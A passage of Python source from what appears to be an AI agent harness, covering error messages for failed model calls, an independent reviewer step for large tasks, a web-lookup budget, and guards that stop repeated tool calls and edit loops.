            self.emit({"type": "error", "text": str(e) + " Raise the limit in Settings or send a message to continue."})
        except Exception as e:
            self._repair("Not run: the turn ended on an error before this call ran. Run it again if still needed.")
            self.unfinished = True                   # the next message picks the task up where it stopped
            msg = raw = str(e)
            if "endpoint could not take this request" in msg:
                head = msg.split(" (HTTP", 1)[0]         # already says what to do; keep only the status
                code = re.search(r"HTTP \d+", msg)
                msg = raw = head + (f" ({code.group(0)})" if code else "")
            elif msg.startswith("QUOTA: "):
                msg = ("Your key's budget or quota is used up, so the model refused the request. Add credit or raise "
                       "the key's limit, or pick another model or key in Settings, then send \"continue\".")
            elif re.search(r"rejected the API key|stopped accepting the API key", msg):
                msg = "The endpoint rejected the API key. Check it in Settings, then send your message again."
            elif re.search(r"HTTP 0|connection problem|timed out|urlopen error", msg, re.I) and \
                    "answers small requests" not in msg and self._recover_off():
                msg = (f"Couldn't reach the model endpoint ({self._endpoint_host()}). Check the network and the "
                       "endpoint address in Settings; `meshpool check --live` tests it.")
            elif re.search(r"HTTP 0|connection problem|timed out|urlopen error", msg, re.I):
                msg = ("Couldn't reach the model, even after waiting for the endpoint to come back. Send \"continue\" "
                       "to pick up where it stopped; the next try starts on a fresh route."
                       if "answers small requests" not in msg else
                       "The endpoint answers small requests, but this conversation's requests keep failing. Send a "
                       "message to try again, or start a new chat.")
            elif re.search(r"HTTP 429", msg):
                msg = ("The model is busy right now (rate limited). Everything done so far is kept: send \"continue\" "
                       "to pick up where it stopped.")
            elif re.search(r"HTTP 5\d\d", msg):
                msg = "The model service had a problem. Send \"continue\" in a moment to pick up where it stopped."
            if re.search(r"HTTP 0|connection problem|timed out|urlopen error|HTTP 5\d\d", raw, re.I):
                _lighten(self.messages)                # the next message starts lighter, on a fresh route
                self.rotate_route()
            if msg != raw:
                msg += f" ({raw[:120]})"               # the detail, for support and the command line
            self.emit({"type": "error", "text": msg})
        finally:
            self._last_final = final
            self._prev_plan = bool(self.plan)
            self._in_turn = False
            if getattr(self, "_plan_next", None) is not None:          # a plan-mode change made during the turn applies now
                self.plan = self._plan_next
            try:
                self._absorb_usage(turn)
            except Exception:  # noqa: BLE001
                pass
            self._end_usage()
            try:
                rec = self.receipt()
                self.last_receipt = rec
                if rec:
                    self.emit({"type": "receipt", "text": rec})
            except Exception:  # noqa: BLE001 - a receipt must never break a turn
                pass
            self.emit({"type": "turn_end", "turn": turn, "session": dict(self.usage)})
            try:
                from meshpool_harness.agent import extras as EX
                EX.run_hooks(self.root, "Stop", {"reply": str(final)[:2000]})
            except Exception:  # noqa: BLE001
                pass
            self._running = False
            self.save(full=True)
        return final

    # ---------- independent grader (agent/grader.py) -----------------------------------------------------------
    def _repeat_note(self, name: str, args: dict, ok: bool) -> str:
        """E2E-AUTONOMY: the same connected-app call that already succeeded this turn, made again, and not a read:
        say it may have been done twice. Reads are never flagged."""
        if not (E2E and MA.assist_on()):
            return ""
        done = self.__dict__.setdefault("_done_calls", {})
        if self._turn_no != done.get("_turn"):
            done.clear()
            done["_turn"] = self._turn_no
        if not ok or MA.read_like(name):
            return ""
        key = name + ":" + json.dumps(args, sort_keys=True, default=str)[:600]
        if key in done:
            return MA.REPEAT
        done[key] = True
        return ""

    def _lookup_note(self, name: str, args: dict) -> str:
        """0.0.13: a research budget. Lookups (web_search, web_research, fetch_url) are counted per turn; past 8 the
        model is told to write from what it has, past 16 to stop. A fetch of a search engine's own results page is
        told to use web_search. One run made 170 fetches of search pages for a one-page agenda."""
        if not E2E or name not in ("web_search", "web_research", "fetch_url"):
            return ""
        c = self.__dict__.setdefault("_lookups", {})
        if c.get("turn") != self._turn_no:
            c.clear()
            c["turn"] = self._turn_no
        c["n"] = c.get("n", 0) + 1
        url = str(args.get("url", "")) if isinstance(args, dict) else ""
        if name == "fetch_url" and re.search(r"(?:google|bing|duckduckgo|yahoo|baidu|yandex)\.[a-z.]+/(?:search|html|\?q=)|[?&]q=", url, re.I):
            return ("\n[Meshpool] That was a search engine page. Do not fetch search result pages (and do not page through "
                    "them): use web_search for searching and fetch_url only for a page you want to read.")
        if c["n"] == 8:
            return ("\n[Meshpool] That is 8 lookups this turn. Unless a specific fact you need is still missing, stop "
                    "researching now and write the deliverable from what you have, sized to what was asked.")
        if c["n"] >= 16 and c["n"] % 4 == 0:
            return (f"\n[Meshpool] {c['n']} lookups this turn is far more than this request needs. Stop researching. "
                    "Write the answer or file now with what you already have, and say what you could not confirm.")
        return ""

    def _tool_msgs_since(self, start: int) -> int:
        return sum(1 for m in self.messages[start:] if m.get("role") == "tool")

    def _grade_info(self, g: dict, final: str) -> dict:
        from meshpool_harness.agent import grader as GR
        msgs = self.messages
        calls, research = GR.count_calls(msgs, g.get("msg0", 0))
        reqs = GR.requests(msgs, g.get("msg0", 0))
        route = getattr(self, "route", None)
        return {"todos": [t for t in getattr(self, "_todos", []) if isinstance(t, dict)], "calls": calls,
                "research": research, "final": final, "request": " ".join(reqs[-3:]), "requests": reqs,
                "files": GR.files_changed(self.root, g.get("t0", self.created), getattr(self.ws, "turn_files", ())),
                "after_plan": bool(g.get("after_plan")), "deep": getattr(route, "lane", "") == "deep",
                "root": str(self.root), "actions": self._accepted_actions()}

    def _accepted_actions(self) -> list[str]:
        """Connected-app writes the tools accepted this turn (for the reviewer's evidence)."""
        done = self.__dict__.get("_done_calls") or {}
        if done.get("_turn") != getattr(self, "_turn_no", None):
            return []
        return [k[:200] for k in done if k != "_turn"]

    def _local_check_passed(self) -> bool:
        """The engine's own validator (check_deck, check_workbook, check_document) passed and nothing was written after
        it: the deliverable already met the house rules, so a reviewer loop would only re-read it (MH_GRADER_LOCAL=0 off)."""
        last_ok, last_write = None, -1
        for i, t in enumerate(getattr(self, "trace", [])[-60:]):
            name = str(t.get("tool", "")).replace("-", "_")
            if re.search(r"(^|__)check_(deck|workbook|document)$", name):
                last_ok = i if t.get("ok", True) and not re.search(r"\bfail", str(t.get("arg", "")), re.I) else None
            elif name in ("write_file", "edit", "apply_patch", "shell", "exec_command", "bash") or \
                    re.search(r"(^|__)(make_|edit_|add_|convert_)", name):
                last_write = i
        return last_ok is not None and last_ok > last_write

    def _small_job(self, info: dict) -> bool:
        """Any lane: under 10 tool calls, one or two files that are not a deck, workbook or web page, a short final
        answer and no failing command after the last edit. A reviewer loop on a one-page document cost 30 to 60
        percent more than the job. Decks, workbooks, pages, multi-file builds and long jobs keep the review."""
        files = [str(f) for f in info.get("files") or []]
        if info.get("calls", 99) >= 10 or not files or len(files) > 2 or len(info.get("final") or "") >= 1500:
            return False
        if any(f.lower().endswith((".pptx", ".xlsx", ".xlsm", ".html", ".htm", ".pbix")) for f in files):
            return False
        after = [c for c in self.ws.commands if c.get("after_edit", -1) >= self.ws.edits and c.get("kind") != "read"]
        return not after or after[-1].get("code") == 0

    def _small_code_verified(self) -> bool:
        """A code task (not a document, deck or app) where the agent ran something after its last edit and the last
        such run succeeded. The independent grader on these cost 2 to 4 times the task itself (measured: $0.0086 against
        $0.0024 per task) and found nothing the passing run had not; it stays for plans, long jobs and app tasks."""
        if self.profile != "code":
            return False
        after = [c for c in self.ws.commands if c.get("after_edit", -1) >= self.ws.edits and c.get("kind") != "read"]
        if os.environ.get("MH_GRADER_ANY_GREEN") == "1":   # A/B: a check that passed at any point after the last edit
            return any(c.get("code") == 0 for c in after)     # (a later probe may fail on purpose), as Codex does
        return bool(after) and after[-1].get("code") == 0

    def _grade_commands(self, g: dict) -> list:
        return [c for c in self.ws.commands[g.get("cmd0", 0):] if c.get("kind") != "read"] or \
            self.ws.commands[g.get("cmd0", 0):][-6:]

    def _grade_usage(self, res: dict, turn: dict) -> None:
        self._absorb_usage(turn)                       # the grader's own calls are in the task already (source grader)

    def _grade_gate(self, g: dict, turn: dict, final: str, force: bool = False) -> tuple[bool, str]:
        """At the final answer of a big task: an independent review. Returns (True, final) when the findings were sent
        back to the agent to fix, else (False, final with the 'Independent check' section). Never raises, never blocks."""
        try:
            from meshpool_harness.agent import grader as GR
            if (getattr(self, "_is_grader", False) or getattr(self, "_delegate_depth", 0) or self.plan or self._lean()
                    or self._bare_codex() or not final.strip() or final.strip() == "(no reply)" or (not force and not GR.enabled())):
                return False, final
            info = self._grade_info(g, final)
            why = "you asked for it" if force else GR.large(info)
            if not why:
                return False, final
            if os.environ.get("MH_GRADER_LOCAL", "1") != "0" and self._local_check_passed():
                return False, final        # check_deck / check_workbook / check_document passed on the last build
            if why.startswith("files made") and os.environ.get("MH_GRADER_SMALL", "0") != "1" and (
                    self._small_code_verified() or self._small_job(info)):
                return False, final        # a small job, or a code change whose own checks passed: no second model loop
            rounds = g.get("grade_rounds", 0)
            self.emit({"type": "status", "text": "Independent check: a separate reviewer is checking the result"
                       + (f" (round {rounds + 1})" if rounds else "") + "..."})
            res = GR.run(self, info, self._grade_commands(g))
            self._grade_usage(res, turn)
            rework = (not force and "error" not in res and GR.needs_rework(res) and rounds < GR.limits()["rounds"])
            text = GR.report(res, rounds)
            ev = GR.event(res, text=text, rounds=rounds, why=why, secs=res.get("secs", 0), usage=res.get("usage") or {},
                          forced=force, rework=rework, model=res.get("model", ""))
            self.last_review = dict(ev, turn=getattr(self, "_turn_no", 0))
            self.emit(ev)
            if rework:
                g["grade_rounds"] = rounds + 1
                self.messages.append({"role": "user", "content": GR.inject_text(res)})
                self._trace_note("grader", f"round {rounds + 1}: {res['not_met']} not met")
                return True, final
            self._trace_note("grader", res.get("verdict", "error"))
            if self.messages and self.messages[-1].get("role") == "assistant" and isinstance(
                    self.messages[-1].get("content"), str) and not force:
                self.messages[-1]["content"] += "\n\n" + text
            return False, (final + "\n\n" + text) if not force else final
        except (Interrupted, KeyboardInterrupt, usage.BudgetExceeded):
            raise
        except Exception as e:  # noqa: BLE001 - the check must never break the turn
            try:
                from meshpool_harness.agent import grader as GR
                res = {"error": f"it hit a problem: {str(e)[:80]}"}
                text = GR.report(res)
                self.emit(GR.event(res, text=text, rounds=g.get("grade_rounds", 0), why="", secs=0, usage={}, forced=force))
                return False, final + "\n\n" + text
            except Exception:  # noqa: BLE001
                return False, final

    def grade_now(self) -> dict:
        """Check the last piece of work on demand (/grade, "Check this"): the same independent review, no rework round.
        Returns the review event."""
        self._stop = False
        turn = {"in": 0, "cached": 0, "out": 0, "calls": 0}
        g = getattr(self, "_last_g", None)
        final = getattr(self, "_last_final", "") or next(
            (m.get("content") for m in reversed(self.messages) if m.get("role") == "assistant"
             and isinstance(m.get("content"), str) and m["content"].strip()), "")
        if g is None:
            i = max((i for i, m in enumerate(self.messages) if m.get("role") == "user"), default=0)
            g = {"msg0": i, "t0": self.created, "cmd0": 0, "after_plan": False, "grade_rounds": 0}
        if not final.strip():
            ev = {"type": "review", "verdict": "error", "error": "there is nothing to check yet", "text":
                  "Independent check: there is nothing to check yet.", "items": [], "met": 0, "total": 0}
            self.emit(ev)
            return ev
        self.last_review = None
        self._task = usage.start_task(chat=self.id, label="grade")
        with usage.bind(self._task, "chat"):
            self._grade_gate(g, turn, final, force=True)
        return getattr(self, "last_review", None) or {}

    def _plan_start(self, route, g: dict):
        """Decide, for free, whether this request needs a written plan; if so the first call is told to write it
        (a line on the request, not the system prompt: the prompt cache stays warm)."""
        last = self.messages[-1].get("content") if self.messages else ""
        text = last if isinstance(last, str) else " ".join(
            p.get("text", "") for p in last or [] if isinstance(p, dict) and p.get("type") == "text")
        if text.startswith("[Added by the user"):                 # a steer picked up in a new turn: same plan state
            return
        self._plan_needed = _PLAN.needed(route, text, self.plan)
        if not self._plan_needed:
            return
        line = "\n\n[Meshpool] " + _PLAN.instruction()
        if isinstance(last, str):
            self.messages[-1]["content"] = last + line
        elif isinstance(last, list):
            self.messages[-1]["content"] = last + [{"type": "text", "text": line.strip()}]

    def _plan_note(self, calls: list, g: dict) -> str:
        """After a step's tool calls: a tiny reminder of the current step every few calls without a plan update, or
        one nudge to write the plan if the first calls went by without one."""
        if any(c.get("function", {}).get("name") == "todo_write" for c in calls):
            g["since_todo"] = 0
            return self._step_method(g)
        g["since_todo"] += len(calls)
        if not self._todo_touched:
            if g["since_todo"] >= 3 and not g["plan_asked"]:
                g["plan_asked"] = True
                return "No plan yet. Write it now with todo_write (3 to 8 checkable steps, the first in_progress)."
            return ""
        if g["since_todo"] >= _PLAN.every():
            g["since_todo"] = 0
            return _PLAN.reminder(self._todos, "Update the plan with todo_write as steps finish.")
        return ""

    def _step_method(self, g: dict) -> str:
        """Per-step method (profile "step_methods"): when the plan's current step changes, route its text with hrouter
        (no tokens); if that step is another sub-harness than the turn's and has a method, one short line with the
        first sentence of it, at most once per sub-harness per turn."""
        route = getattr(self, "route", None)
        try:
            if route is None or not self.hsettings()["step_methods"]:
                return ""
            cur = _PLAN.current(self._todos)
            if cur < 0 or cur == g.get("step_cur"):
                return ""
            g["step_cur"] = cur
            from meshpool_harness import hrouter as HRR
            from meshpool_harness.hrouter.route import method_summary
            sr = HRR.route(str(self._todos[cur].get("content", "")), kind="code" if route.family == "code"
                           else "cowork", workdir=str(self.root))
            seen = g.setdefault("step_seen", set())
            if sr.spec == route.spec or sr.spec in seen or sr.spec in ("chat", "general"):
                return ""
            sr.settings = route.settings              # the step runs under the turn's profile (same method set)
            m = method_summary(sr)
            if not m:
                return ""
            seen.add(sr.spec)
            return f"For this step ({sr.label}): {m}"
        except Exception:  # noqa: BLE001 - a hint must never break the turn
            return ""

    def plan_state(self) -> dict | None:
        """The plan as a dict {items, current, total, done}, or None when the agent has not written one."""
        return _PLAN.state(self._todos)

    _LOOP_EXACT = 3      # the same call, with no file changed since, is refused from its 3rd run
    _LOOP_SHAPE = 5      # the same call with only numbers changed (od -c | sed -n '8,9p', '9,10p', ...): from the 5th

    _REFUSED = ("[Meshpool] Not run", "[Meshpool] Shell checks stopped")
    _FAILED = re.compile(r"(?:ERROR: |\[exit [1-9]\d*\]"
                         r"|Chunk ID: \w+\nWall time: [^\n]*\nProcess exited with code (?!0\n))")   # exec_command

    _OFFICE_LOOKS = ("check_deck", "check_workbook", "check_document", "view_output", "measure_office_file")

    def _guarded_tool(self, c: dict, g: dict, cut: bool = False) -> str:
        name = (c.get("function") or {}).get("name") or ""
        short = name.rsplit("__", 1)[-1]
        if short in self._OFFICE_LOOKS and self._office_direct():
            # Office-7 on 9cd021c0: pptx_chart ran check_deck 3-5 times a run (43 calls vs Codex's 28). Two looks at
            # the same kind of check per request; after that the agent answers or fixes what they found.
            seen = g.setdefault("office_looks", {})
            seen[short] = seen.get(short, 0) + 1
            try:
                cap = int(os.environ.get("MH_OFFICE_LOOK_CAP", "2") or 0)
            except ValueError:
                cap = 2
            if cap and seen[short] > cap:
                g["rseq"] = g.get("rseq", 0) + 1          # a refusal like the others: the refused-streak guard counts it
                return (f"[Meshpool] Not run: {short} already ran {cap} times for this request. Fix what it reported "
                        "and answer, or answer now if it found nothing to fix.")
        out = self._guarded_tool_inner(c, g, cut)
        # consecutive refused calls (a model re-sending a call the guards just refused); any call that runs resets it
        refused = str(out).startswith(self._REFUSED)
        if not refused:
            out = str(out) + self._scratch_rewrite_note(c, g) + self._shape_run_note(c, g, out) + self._cycle_note(c, g) \
                + self._office_verify_note(g)
        g["rseq"] = g.get("rseq", 0) + 1 if refused else 0
        # consecutive failed calls (exit != 0, a rejected edit, a tool error) with no file changed since: distinct calls
        # that each fail slip past the repeat guards (eval trace: 10 broken probes, then 6 rejected patches, then timeout)
        if not refused:
            edits = getattr(self.ws, "edits", None)
            if edits != g.get("f_edits", edits) or not self._FAILED.match(str(out)):
                g["fseq"] = 0
            else:
                g["fseq"] = g.get("fseq", 0) + 1
            g["f_edits"] = edits
        try:
            from meshpool_harness.agent import extras as EX
            f = c.get("function", {})
            try:
                a = json.loads(f.get("arguments") or "{}")
            except ValueError:
                a = {}
            _, note = EX.run_hooks(self.root, "PostToolUse", {"result": str(out)[:2000]}, tool=f.get("name", ""),
                                   args=a if isinstance(a, dict) else {})
            if note:
                out = f"{out}\n[Hook] {note}"
        except Exception:  # noqa: BLE001 - a hook never breaks a tool call
            pass
        return out

    def _guarded_tool_inner(self, c: dict, g: dict, cut: bool = False) -> str:
        """Run one tool call unless it repeats itself with nothing changed in between. The eval traces had runs of
        30-50 near-identical inspection commands (byte dumps of an unchanged file) that a note alone never stopped;
        refusing the repeat, with the reason, is what breaks the loop. An edit in between resets the count, so
        rerunning a check after changing code is never refused."""
        try:
            f = c.get("function", {})
            name, args = f.get("name", ""), str(f.get("arguments", ""))
            bg = self.ws.__dict__.get("_bg") or {}
            if any(e["p"].poll() is None for e in list(bg.values())) or not self._inspection(name, args):
                # a background command is running (its output changes with no edit), or the call is not a read-only
                # look: a flaky check or an MCP call can rightly repeat with no edit
                return self._repeat_guard(c, g, cut)
            exact = name + ":" + args[:2000]
            # numbers-only variation (od -c | sed -n '8,9p', '9,10p') is a loop for shell commands only: read_file on
            # other line ranges or files numbered chunk_01, chunk_02 is real progress through a file
            shape = (name + ":" + re.sub(r"\d+", "#", args[:2000])
                     if name in ("bash", "bash_many", "shell", "exec_command") else exact)
            book = g.setdefault("loop", {})
            edits = self.ws.edits
            for key, limit in ((exact, self._LOOP_EXACT), (shape, self._LOOP_SHAPE)):
                runs = [e for e in book.get(key, []) if e == edits]
                if len(runs) + 1 >= limit and name not in ("todo_write", "update_plan", "ask_user", "finish"):
                    g["refused"] = g.get("refused", 0) + 1
                    shown = ("what the command printed" if name in T.CODEX_TOOLS or name == "exec_command"
                             else "what read_file shows")
                    return ("[Meshpool] Not run: you already made this call (or the same call with only numbers "
                            f"changed) {len(runs)} times and no file has changed since, so the result would be the "
                            f"same. The file contents are exactly {shown} (plain text, no hidden "
                            "characters unless a tool says so). Act on what you have: make the change, run your "
                            "check, or answer.")
            for key in {exact, shape}:                 # one count per run, also when the two keys are equal
                book.setdefault(key, []).append(edits)
        except Exception:  # noqa: BLE001 - the guard must never break a turn
            pass
        return self._repeat_guard(c, g, cut)

    _POLL = re.compile(r"\b(gh\s+(run|pr|workflow)|curl|wget|kubectl\s+get|docker\s+(ps|logs)|systemctl\s+status|squeue|"
                       r"tail\s+-f|sleep|ping|watch)\b")
    _SCRATCH = re.compile(r"(^|/)(_[^/]*|(check|probe|scratch|tmp|debug|repro|try)[\w.-]*)\.(py|js|ts|sh|txt|json)$", re.I)

    def _tree_sig(self):
        """A fingerprint of the project's files except the ones the agent makes only to probe with (_probe.py, check_*.py,
        scratch files): None for a very large tree. Equal fingerprints mean no task file changed in between."""
        h, n = 0, 0
        skip = {".git", "node_modules", "__pycache__", ".run", ".meshpool", ".venv", "venv", ".pytest_cache", ".mypy_cache"}
        try:
            for dp, dn, fn in os.walk(self.root):
                dn[:] = [d for d in dn if d not in skip]
                for f in fn:
                    rel = os.path.relpath(os.path.join(dp, f), self.root).replace("\\", "/")
                    if self._SCRATCH.search(rel):
                        continue
                    st = os.stat(os.path.join(dp, f))
                    h ^= hash((rel, st.st_mtime_ns, st.st_size))
                    n += 1
                    if n > 4000:
                        return None
        except OSError:
            return None
        return h

    @staticmethod
    def _write_target(name: str, args: str):
        """(file, tiny) for a call that edits one file, else None. tiny: under 400 characters of change."""
        try:
            a = json.loads(args or "{}")
        except ValueError:
            return None
        if name == "apply_patch":
            body = str(a.get("input") or "")
            files = re.findall(r"^\*\*\* (?:Update|Add) File: (.+)$", body, flags=re.M)
            return (files[0].strip(), len(body) < 400) if len(files) == 1 else None
        if name in ("edit", "write_file") and a.get("path"):
            return (str(a["path"]), len(str(a.get("new") or a.get("content") or "")) < 400)
        return None

    def _repeat_guard(self, c: dict, g: dict, cut: bool = False) -> str:
        """Run a tool call, unless the same call has just run three times in a row with the same result: a fourth time
        cannot tell the model anything new (one such loop, 60 calls and 1M tokens, cost more than a hundred tasks).
        Switches, all off by default (not measured on the 52 tasks yet):
        MH_REPEAT_WINDOW=1  count over the last 12 calls, not only in a row, and only while no file changed;
        MH_REPEAT_SHAPE=1   a shell command that differs only in its numbers counts as the same call;
        MH_FAILURE_HINT=1   the second identical failure gets a note to change approach."""
        f = c.get("function", {})
        key = str(f.get("name", "")) + ":" + str(f.get("arguments", ""))[:2000]
        if os.environ.get("MH_REPEAT_SHAPE") == "1" and f.get("name") in ("shell", "exec_command", "bash", "bash_many"):
            key = re.sub(r"\d+", "#", key)
        runs = g.setdefault("same", [])
        edits = self.ws.edits
        nm = str(f.get("name", ""))
        wf = self._write_target(nm, str(f.get("arguments", "")))
        if wf and os.environ.get("MH_REPEAT_WRITES", "1") != "0":
            st = g.setdefault("wl", {}).setdefault(wf[0], {"n": 0, "mark": g.get("wprog", 0)})
            if st["mark"] != g.get("wprog", 0):
                st["n"], st["mark"] = 0, g.get("wprog", 0)     # something else changed since the last edit: not a loop
            if wf[1]:
                st["n"] += 1
                if st["n"] > 8:
                    return (f"[Meshpool] Not done: you have edited {wf[0]} {st['n'] - 1} times with tiny changes and nothing "
                            "else changed. Run the real check or answer; no more edits to this file this turn.")
            else:
                st["n"] = 0
        if os.environ.get("MH_REPEAT_READS", "1") != "0" and (
                self._inspection(nm, str(f.get("arguments", ""))) or (nm.startswith("mcp__") and MA.read_like(nm))):
            bg = self.ws.__dict__.get("_bg") or {}
            prev = [r for r in runs if r[0] == key and r[2] == edits]
            if not any(e["p"].poll() is None for e in list(bg.values())) and len(prev) >= 2 and \
                    len({r[1] for r in prev}) == 1:
                # the same look, nothing changed since, the same result twice already: a third run says nothing new
                g["refused"] = g.get("refused", 0) + 1
                runs.append((key, prev[-1][1], edits, False, prev[-1][4], None))      # counts toward the 5th ask
                del runs[:-12]
                more = (" You have asked this " + str(len(prev) + 1) + " times. Change your approach: edit, run the "
                        "tests, or answer with what you have." if len(prev) >= 4 else "")
                return ("[Meshpool] Not run: you already ran this; the result is unchanged and no file changed since. "
                        "It was: " + str(prev[-1][4])[:200].replace("\n", " ") + more)
        if os.environ.get("MH_REPEAT_WINDOW") == "1":
            stuck = (sum(1 for r in runs if r[0] == key and r[2] == edits and r[3]) >= 3
                     and len({r[1] for r in runs if r[0] == key and r[2] == edits}) == 1)
        else:
            stuck = (len(runs) >= 3 and all(r[0] == key and r[3] for r in runs[-3:])
                 and len({r[1] for r in runs[-3:]}) == 1)
        if stuck:
            g["refused"] = g.get("refused", 0) + 1
            return ("[Meshpool] Not run: this exact call has run three times with the same result. Running it again "
                    "changes nothing. Change the command or the files first, or finish and tell the user what is "
                    "blocking you.")
        sh = (nm in ("shell", "exec_command", "bash", "bash_many") and os.environ.get("MH_REPEAT_SHELL", "1") != "0"
              and not self._POLL.search(str(f.get("arguments", ""))))     # a poll of a job or service may repeat
        sig = self._tree_sig() if sh else None
        if sh and sig is not None:
            bg = self.ws.__dict__.get("_bg") or {}
            killed = [r for r in runs if r[0] == key and len(r) > 6 and r[6]]
            if len(killed) >= 2 and not any(e["p"].poll() is None for e in list((self.ws.__dict__.get("_bg") or {}).values())):
                return ("[Meshpool] Not run: this command was killed twice already (exit 137 or 124: it ran out of memory "
                        "or time). Running it again will not change that. Use a smaller input, a shorter timeout, or "
                        "another approach.")
            same = [r for r in runs if r[0] == key and len(r) > 5 and r[5] == sig]
            sq = g.get("sseq") or {}
            if not any(e["p"].poll() is None for e in list(bg.values())):
                if len(same) >= 2 and len({r[1] for r in same}) == 1:
                    return ("[Meshpool] Not run: you already ran this command; the result is unchanged and no project file "
                            "changed since. It was: " + str(same[-1][4])[:200].replace("\n", " "))
                if sq.get("sig") == sig and sq.get("n", 0) >= 10:
                    return ("[Meshpool] Shell checks stopped for this turn: ten runs in a row gave the same result and no "
                            "project file changed. Give your best answer from what you have, and say what is unresolved.")
        out = self._run_tool(c, cut=cut)
        import hashlib
        h = hashlib.md5(str(out).encode("utf-8", "replace")).hexdigest()
        failed = bool(re.search(r"\[exit (?!0\b)\d+\]|Process exited with code (?!0\b)-?\d+|timed out|Traceback|Error|"
                                r"failed|not found", str(out)))
        if os.environ.get("MH_FAILURE_HINT") == "1" and failed and \
                any(r[0] == key and r[1] == h and r[2] == edits for r in runs):
            out = str(out) + ("\n[Meshpool] The same call failed the same way again. Do not repeat it: narrow it (one "
                              "case, a shorter timeout), print what it is waiting on, or change the code first.")
        wnote = ""
        nwr = g.get("wl", {}).get(wf[0], {}).get("n", 0) if wf else 0
        if wf and wf[1] and nwr > 4:
            wnote = (f"\n[Meshpool] You have edited {wf[0]} {nwr} times with tiny changes and nothing else "
                     "changed; stop editing it and run the real check, or answer.")
        if wf:
            for k, v in g.get("wl", {}).items():
                if k != wf[0]:
                    v["n"] = 0
            g["wprog"] = g.get("wprog", 0) + (0 if wf[1] and nwr > 0 else 1)
        else:                                      # a command whose key is new or whose pass/fail flipped is progress
            last = [r for r in runs if r[0] == key]
            if not last or last[-1][3] != failed:
                g["wprog"] = g.get("wprog", 0) + 1
        if sh:
            sig2 = self._tree_sig()
            sq = g.get("sseq") or {}
            sq = {"sig": sig2, "h": h, "n": sq["n"] + 1} if sq and sq.get("sig") == sig2 and sq.get("h") == h and sig2 is not None \
                else {"sig": sig2, "h": h, "n": 1}
            g["sseq"] = sq
            if sq["n"] >= 6:
                wnote += "\n[Meshpool] Your checks keep giving the same result; change approach or answer."
            sig = sig2
        out = str(out) + wnote if wnote else out
        oom = bool(re.search(r"\[exit (137|124)\]|\brc=(137|124)\b|exit(?:ed with)? code (137|124)\b|\bKilled\b|timed out",
                             str(out)))
        runs.append((key, h, edits, failed, str(out)[:240], sig, oom))   # a failed call counts for the failure breaker; a read for the read breaker
        del runs[:-12]
        return out

    @staticmethod
    def _inspection(name: str, args: str) -> bool:
        """A call that only reads: read_file, grep, glob, or shell commands that core/tools.read_only accepts."""
        if name in ("read_file", "grep", "glob"):
            return True
        if name in ("bash", "bash_many", "shell", "exec_command"):
            try:
                a = json.loads(args or "{}")
            except ValueError:
                return False
            cmds = a.get("commands") if name == "bash_many" else [a.get("cmd" if name == "exec_command" else "command")]
            if name == "shell" and a.get("command") is not None:
                cmds = [T.shell_script(a["command"])]          # the script inside ["bash", "-lc", script]
            cmds = [x for x in (cmds or []) if isinstance(x, str) and x.strip()]
            return bool(cmds) and all(T.read_only(x) for x in cmds)
        return False

    _SCRATCH_W = re.compile(r"(?:cat|tee)\s*(?:-a\s*)?>?\s*['\"]?((?:/tmp/|\$TMPDIR/|\$\{TMPDIR\}/)[\w./-]+)|"
                            r">\s*['\"]?((?:/tmp/|\$TMPDIR/|\$\{TMPDIR\}/)[\w./-]+)['\"]?\s*<<")

    def _shape_run_note(self, c: dict, g: dict, out: str = "") -> str:
        """The same shell command again and again with only its numbers changed and no file edited in between, each
        run succeeding (eval 283eced2, perf-dag-paths: the fix was done at 28 s, then 50 timing runs of one python -c
        with the input size bumped 44, 50, 56 ... 320, to 352 s; no failure, no refusal, so no other guard saw it).
        Inspection commands already have a refusal for this; this covers runs. 4th in a row: a note; 8th: tools off.
        MH_SHAPE_NUDGE / MH_SHAPE_WRAP tune it (0 turns it off)."""
        f = c.get("function", {})
        if f.get("name") not in ("shell", "exec_command", "bash", "bash_many"):
            return ""
        if self._FAILED.match(str(out)):               # failing runs are the failure guard's: start over
            g.pop("shape_key", None)
            return ""
        try:
            nudge = int(os.environ.get("MH_SHAPE_NUDGE", "4") or 0)
            wrap = int(os.environ.get("MH_SHAPE_WRAP", "8") or 0)
        except ValueError:
            nudge, wrap = 4, 8
        shape = re.sub(r"\d+", "#", str(f.get("arguments", ""))[:2000])
        key = (shape, getattr(self.ws, "edits", 0))
        if g.get("shape_key") == key:
            fp = self._tree_fingerprint()              # a command that writes files (touch f1, f2 ...) is progress
            g["shape_n"] = g.get("shape_n", 0) + 1 if fp == g.get("shape_fp") else 1
        else:
            fp, g["shape_n"] = None, 1
        g["shape_key"], g["shape_fp"] = key, fp if fp is not None else self._tree_fingerprint()
        n = g["shape_n"]
        if wrap > 0 and n >= wrap and not g.get("hard_wrap"):
            g["hard_wrap"] = True
            return (f"\n[Meshpool] You have run this command {n} times with only its numbers changed and no file "
                    "changed. Tools are off now: answer with what the runs showed.")
        if nudge > 0 and n == nudge:
            return (f"\n[Meshpool] This is the {n}th run of the same command with only its numbers changed, and no file "
                    "changed in between. More sizes will not change the conclusion: decide from what you have, then "
                    "finish or make the next change.")
        return ""

    def _tree_fingerprint(self, cap: int = 20000) -> int:
        """Names, sizes and mtimes of the project's files (no .git, at most `cap` entries): cheap, and it changes when
        a shell command writes a file."""
        h, n = 0, 0
        try:
            for dp, dns, fns in os.walk(self.root):
                dns[:] = [d for d in dns if d not in (".git", "node_modules", "__pycache__", ".venv")]
                for fn in fns:
                    try:
                        st = os.stat(os.path.join(dp, fn))
                    except OSError:
                        continue
                    h ^= hash((dp, fn, st.st_size, st.st_mtime_ns))
                    n += 1
                    if n >= cap:
                        return h
        except OSError:
            pass
        return h

    _SAVES = re.compile(r"\.save\(|\.save_as\(|to_excel\(|\.write_bytes\(|soffice\b.*--convert-to")

    def _office_verify_note(self, g: dict) -> str:
        """Office direct: once the file is saved and MH_OFFICE_VERIFY_CAP (4) checks in a row have passed since, the
        result says once to stop checking and answer. Office-7 on 59e49c8b: pptx_chart 38 calls and xlsx_budget 41
        where Codex used 10-12, most of them re-checks of a file that was already right."""
        if g.get("verify_capped") or not self._office_direct():
            return ""
        try:
            cap = int(os.environ.get("MH_OFFICE_VERIFY_CAP", "4") or 0)
        except ValueError:
            cap = 4
        if cap <= 0:
            return ""
        cmds = (getattr(self.ws, "commands", None) or [])[g.get("cmds0", 0):]
        saved = [i for i, c in enumerate(cmds) if c.get("code") == 0 and self._SAVES.search(str(c.get("cmd", "")))]
        if not saved:
            return ""
        after = cmds[saved[-1] + 1:]
        # only checks count: a read or an assert, never a script that may itself write (`python make_letter.py 3`)
